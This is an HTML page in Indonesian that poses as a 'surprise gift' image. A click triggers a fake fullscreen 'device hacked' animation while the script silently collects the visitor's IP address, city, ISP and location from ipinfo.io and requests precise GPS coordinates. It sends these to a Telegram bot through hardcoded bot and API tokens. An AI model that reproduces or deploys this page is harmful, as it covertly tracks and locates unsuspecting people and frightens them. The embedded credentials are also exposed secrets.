<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Surprise For You</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        #umpan {
            cursor: pointer;
            width: 300px;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: transform 0.3s;
        }

        #layar-hack {
            display: none; 
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            box-sizing: border-box;
            z-index: 9999;
            overflow-y: auto;
            scroll-behavior: smooth;
        }

        .teks-berjalan {
            white-space: pre-wrap;
            word-wrap: break-word;
            padding-bottom: 50px;
        }
    </style>
</head>
<body>

    <audio id="suara-ketik" preload="auto" src="https://www.soundjay.com/communication/typing-on-a-computer-keyboard-1.mp3"></audio>
    <audio id="suara-alert" preload="auto" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>

    <div id="kontainer">
        <h2 style="text-align: center;">Klik gambar untuk melihat hadiah ✨</h2>
        <img id="umpan" src="https://picsum.photos/300/200" alt="Hadiah">
    </div>

    <div id="layar-hack">
        <div class="teks-berjalan" id="log-hacker"></div>
    </div>

    <script>
        const gambar = document.getElementById('umpan');
        const layarHack = document.getElementById('layar-hack');
        const logHacker = document.getElementById('log-hacker');
        const suaraKetik = document.getElementById('suara-ketik');
        const suaraAlert = document.getElementById('suara-alert');

        // --- DATA TELEGRAM & IPINFO ---
        const TOKEN_BOT = "8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU"; 
        const CHAT_ID = "7332180572"; 
        const IPINFO_TOKEN = "6dd4d76f655366"; // Token ipinfo.io kamu
        // ------------------------------

        const pesanAwal = [
            "> Initializing exploit mechanism...",
            "> Establishing secure connection...",
            "> Bypassing SSL certificate..."
        ];

        const pesanAkhir = [
            "> [CRITICAL] Internal database accessed!",
            "> Downloading sensitive_data.zip (100%)",
            "> WARNING: Administrator detected!",
            "> Locating target coordinates...",
            "> GPS signal locked...",
            "> ---------------------------------------",
            "> STATUS: YOUR DEVICE HAS BEEN HACKED!",
            "> ---------------------------------------",
            "> System cleanup initiated...",
            "> Have a nice day! :P"
        ];

        function kirimTele(teks) {
            const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`;
            fetch(url).catch(err => console.log("Gagal kirim"));
        }

        // Lapis 1: IP Tracking (Silent) + Tampilkan di Layar
        async function ambilDataIP() {
            try {
                const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
                const data = await response.json();
                
                // Kirim ke Telegram
                const infoIP = `🌐 *TARGET IP DETECTED (SILENT)*%0A🔌 IP: ${data.ip}%0A🏙️ Kota: ${data.city}%0A🏢 ISP: ${data.org}%0A📍 Lokasi: ${data.loc}`;
                kirimTele(infoIP);

                // Sisipkan data asli target ke layar simulasi
                logHacker.innerHTML += `<span style="color: yellow;">> INFILTRATING IP: ${data.ip}...</span><br>`;
                logHacker.innerHTML += `<span style="color: yellow;">> ACCESSING ISP: ${data.org}...</span><br>`;
                
                return true;
            } catch (err) {
                kirimTele("Gagal mengambil data IP via ipinfo.");
                return false;
            }
        }

        // Lapis 2: GPS (Pakai Izin)
        function ambilGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const infoGPS = `🚨 *LOKASI PRESISI (GPS)*%0A📍 Koordinat: ${lat},${lon}%0A🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}`;
                    kirimTele(infoGPS);
                }, null, { enableHighAccuracy: true });
            }
        }

        // Animasi Teks Bergantian
        async function jalankanAnimasi(arrayPesan, index = 0) {
            if (index < arrayPesan.length) {
                suaraKetik.currentTime = 0;
                suaraKetik.play().catch(() => {}); 

                if (arrayPesan[index].includes("WARNING") || arrayPesan[index].includes("HACKED")) {
                    suaraAlert.currentTime = 0;
                    suaraAlert.play().catch(() => {});
                }

                logHacker.innerHTML += arrayPesan[index] + "<br>";
                layarHack.scrollTop = layarHack.scrollHeight;
                
                setTimeout(() => jalankanAnimasi(arrayPesan, index + 1), 450);
            }
        }

        gambar.addEventListener('click', async () => {
            // Audio Unlocking
            suaraKetik.play().then(() => {
                suaraKetik.pause();
                suaraAlert.play().then(() => suaraAlert.pause());
            }).catch(() => {});

            layarHack.style.display = 'block';
            
            // Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            // Jalankan urutan aksi
            await jalankanAnimasi(pesanAwal); // Teks awal
            await ambilDataIP();              // Ambil IP & Tampilkan di layar
            ambilGPS();                       // Minta GPS
            jalankanAnimasi(pesanAkhir);      // Teks akhir
        });

        layarHack.addEventListener('click', () => {
            layarHack.style.display = 'none';
            if (document.exitFullscreen) document.exitFullscreen();
            logHacker.innerHTML = ""; 
        });
    </script>
</body>
</html>
